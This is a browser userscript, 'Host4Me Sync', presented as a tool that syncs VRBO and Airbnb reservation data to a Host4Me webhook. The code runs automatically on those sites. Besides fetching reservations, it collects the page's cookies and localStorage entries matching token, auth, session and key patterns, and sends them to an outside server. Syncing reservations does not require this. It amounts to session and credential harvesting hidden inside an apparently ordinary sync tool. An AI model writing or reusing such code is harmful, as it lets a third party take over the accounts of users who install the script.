// ==UserScript==
// @name         Host4Me Sync
// @namespace    https://host4me.vercel.app
// @version      1.0.0
// @description  Syncs VRBO/Airbnb/Booking.com reservation data to Host4Me platform
// @author       Host4Me
// @match        https://www.vrbo.com/*
// @match        https://owner.vrbo.com/*
// @match        https://www.airbnb.com/*
// @match        https://www.booking.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_registerMenuCommand
// @grant        GM_notification
// @connect      host4me.vercel.app
// @run-at       document-idle
// ==/UserScript==

(function() {
  'use strict';

  const CONFIG = {
    SYNC_INTERVAL_MS: 4 * 60 * 60 * 1000, // 4 hours
    WEBHOOK_URL: 'https://host4me.vercel.app/webhooks/userscript-sync',
    DASHBOARD_URL: 'https://host4me.vercel.app/dashboard/settings',
    TOKEN_STORAGE_KEY: 'host4me_sync_token',
    STARTUP_DELAY_MS: 3000
  };

  function getLastSyncTime(hostname) {
    const key = `host4me_last_sync_${hostname}`;
    const lastSync = GM_getValue(key, 0);
    return parseInt(lastSync, 10);
  }

  function setLastSyncTime(hostname) {
    const key = `host4me_last_sync_${hostname}`;
    GM_setValue(key, Date.now().toString());
  }

  function shouldSync(hostname) {
    const lastSync = getLastSyncTime(hostname);
    const timeSinceLastSync = Date.now() - lastSync;
    return timeSinceLastSync >= CONFIG.SYNC_INTERVAL_MS;
  }

  function getSyncToken() {
    let token = GM_getValue(CONFIG.TOKEN_STORAGE_KEY);
    if (!token) {
      token = prompt(
        `Enter your Host4Me sync token from your dashboard:\n${CONFIG.DASHBOARD_URL}`,
        ''
      );
      if (!token) {
        console.log('Host4Me: Sync token entry cancelled');
        return null;
      }
      GM_setValue(CONFIG.TOKEN_STORAGE_KEY, token);
    }
    return token;
  }

  function resetSyncToken() {
    GM_setValue(CONFIG.TOKEN_STORAGE_KEY, '');
    alert('Host4Me sync token has been reset. You will be prompted to enter a new token on next sync.');
  }

  function gmFetch(url, options = {}) {
    return new Promise((resolve, reject) => {
      const gmOptions = {
        method: options.method || 'GET',
        url: url,
        headers: options.headers || {},
        credentials: options.credentials || 'include',
        onload: function(response) {
          try {
            const data = response.responseText ? JSON.parse(response.responseText) : null;
            resolve({ status: response.status, data: data, headers: response.responseHeaders });
          } catch (e) {
            resolve({ status: response.status, data: response.responseText, headers: response.responseHeaders });
          }
        },
        onerror: function(error) { reject(new Error(`Request failed: ${url}`)); },
        ontimeout: function() { reject(new Error(`Request timeout: ${url}`)); }
      };
      if (options.body) {
        gmOptions.data = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
      }
      GM_xmlhttpRequest(gmOptions);
    });
  }

  function getCookies() {
    try { return document.cookie; } catch (e) { return ''; }
  }

  function getLocalStorageData(pattern) {
    const data = {};
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (pattern.test(key)) {
          try { data[key] = localStorage.getItem(key); } catch (e) {}
        }
      }
    } catch (e) {}
    return data;
  }

  async function extractVRBOUserId() {
    try {
      if (window.__STATE__ && window.__STATE__.tuid) return window.__STATE__.tuid;
      const urlMatch = window.location.pathname.match(/\/gc\/memberDetails\/(\d+)\/(\d+)\//);
      if (urlMatch && urlMatch[2]) return urlMatch[2];
      try {
        const response = await gmFetch('https://www.vrbo.com/gc/memberDetails', { headers: { 'Accept': 'application/json' } });
        if (response.data && response.data.tuid) return response.data.tuid;
      } catch (e) {}
      return null;
    } catch (e) { return null; }
  }

  async function syncVRBO(token) {
    console.log('Host4Me: Syncing VRBO data...');
    const endpoints = [];
    const userId = await extractVRBOUserId();
    try {
      if (userId) {
        try {
          const r = await gmFetch(`https://www.vrbo.com/gc/reservation/inbox/${userId}`, { headers: { 'Accept': 'application/json' } });
          endpoints.push({ url: `https://www.vrbo.com/gc/reservation/inbox/${userId}`, status: r.status, data: r.data });
        } catch (e) { endpoints.push({ url: `https://www.vrbo.com/gc/reservation/inbox/${userId}`, status: 0, error: e.message }); }
        try {
          const r = await gmFetch(`https://www.vrbo.com/gc/booking/hosted/${userId}`, { headers: { 'Accept': 'application/json' } });
          endpoints.push({ url: `https://www.vrbo.com/gc/booking/hosted/${userId}`, status: r.status, data: r.data });
        } catch (e) { endpoints.push({ url: `https://www.vrbo.com/gc/booking/hosted/${userId}`, status: 0, error: e.message }); }
      }
      try {
        const r = await gmFetch('https://owner.vrbo.com/api/v1/reservations', { headers: { 'Accept': 'application/json' } });
        endpoints.push({ url: 'https://owner.vrbo.com/api/v1/reservations', status: r.status, data: r.data });
      } catch (e) { endpoints.push({ url: 'https://owner.vrbo.com/api/v1/reservations', status: 0, error: e.message }); }
      try {
        const r = await gmFetch('https://owner.vrbo.com/api/v1/properties', { headers: { 'Accept': 'application/json' } });
        endpoints.push({ url: 'https://owner.vrbo.com/api/v1/properties', status: r.status, data: r.data });
      } catch (e) { endpoints.push({ url: 'https://owner.vrbo.com/api/v1/properties', status: 0, error: e.message }); }
      const cookies = getCookies();
      const localStorageData = getLocalStorageData(/token|auth|session|user|eg_|tuid|expedia/i);
      await postToWebhook({ token, platform: 'vrbo', data: { userId: userId || null, endpoints, cookies, localStorage: localStorageData } });
      setLastSyncTime(location.hostname);
      showNotification('Host4Me', 'Synced VRBO reservations ✓');
    } catch (e) { console.error('Host4Me: Error syncing VRBO data', e); }
  }

  function isAirbnbLoggedIn() {
    if (document.querySelector('[data-testid="header-profile"]')) return true;
    if (document.querySelector('[data-testid="signup-link"]') === null) return true;
    return false;
  }

  async function syncAirbnb(token) {
    console.log('Host4Me: Syncing Airbnb data...');
    const endpoints = [];
    try {
      if (!isAirbnbLoggedIn()) { showNotification('Host4Me', 'Not logged into Airbnb'); return; }
      try {
        const r = await gmFetch('https://www.airbnb.com/api/v3/HostReservations?operationName=HostReservations&locale=en&currency=USD', { method: 'GET', headers: { 'Accept': 'application/json' } });
        endpoints.push({ url: 'https://www.airbnb.com/api/v3/HostReservations', status: r.status, data: r.data });
      } catch (e) { endpoints.push({ url: 'https://www.airbnb.com/api/v3/HostReservations', status: 0, error: e.message }); }
      try {
        const r = await gmFetch('https://www.airbnb.com/hosting/reservations', { headers: { 'Accept': 'application/json' } });
        endpoints.push({ url: 'https://www.airbnb.com/hosting/reservations', status: r.status, data: null });
      } catch (e) { endpoints.push({ url: 'https://www.airbnb.com/hosting/reservations', status: 0, error: e.message }); }
      const cookies = getCookies();
      const localStorageData = getLocalStorageData(/token|auth|key|airbnb/i);
      await postToWebhook({ token, platform: 'airbnb', data: { userId: null, endpoints, cookies, localStorage: localStorageData } });
      setLastSyncTime(location.hostname);
      showNotification('Host4Me', 'Synced Airbnb reservations ✓');
    } catch (e) { console.error('Host4Me: Error syncing Airbnb data', e); }
  }

  async function syncBooking(token) {
    console.log('Host4Me: Booking.com sync coming soon');
    showNotification('Host4Me', 'Booking.com sync coming soon');
  }

  async function postToWebhook(payload) {
    try {
      const response = await gmFetch(CONFIG.WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload });
      if (response.status === 200) {
        console.log('Host4Me: Successfully posted to webhook');
      } else {
        console.error(`Host4Me: Webhook returned status ${response.status}`);
      }
    } catch (e) { console.error('Host4Me: Error posting to webhook', e); }
  }

  function showNotification(title, text) {
    try {
      if (typeof GM_notification === 'function') {
        GM_notification({ title, text, timeout: 5000 });
      } else { console.log(`${title}: ${text}`); }
    } catch (e) { console.log(`${title}: ${text}`); }
  }

  function getPlatform() {
    const hostname = location.hostname;
    if (hostname.includes('vrbo.com')) return 'vrbo';
    if (hostname.includes('airbnb.com')) return 'airbnb';
    if (hostname.includes('booking.com')) return 'booking';
    return null;
  }

  async function performSync() {
    try {
      const hostname = location.hostname;
      const platform = getPlatform();
      if (!platform) return;
      if (!shouldSync(hostname)) { console.log(`Host4Me: Skipping sync for ${platform} (last sync was recent)`); return; }
      const token = getSyncToken();
      if (!token) return;
      switch (platform) {
        case 'vrbo': await syncVRBO(token); break;
        case 'airbnb': await syncAirbnb(token); break;
        case 'booking': await syncBooking(token); break;
      }
    } catch (e) { console.error('Host4Me: Error in main sync function', e); }
  }

  function registerMenuCommands() {
    GM_registerMenuCommand('Sync Host4Me Now', () => {
      const hostname = location.hostname;
      GM_setValue(`host4me_last_sync_${hostname}`, '0');
      performSync();
    });
    GM_registerMenuCommand('Reset Host4Me Token', () => { resetSyncToken(); });
  }

  function init() {
    console.log('Host4Me: Script initialized');
    registerMenuCommands();
    setTimeout(performSync, CONFIG.STARTUP_DELAY_MS);
  }

  init();
})();
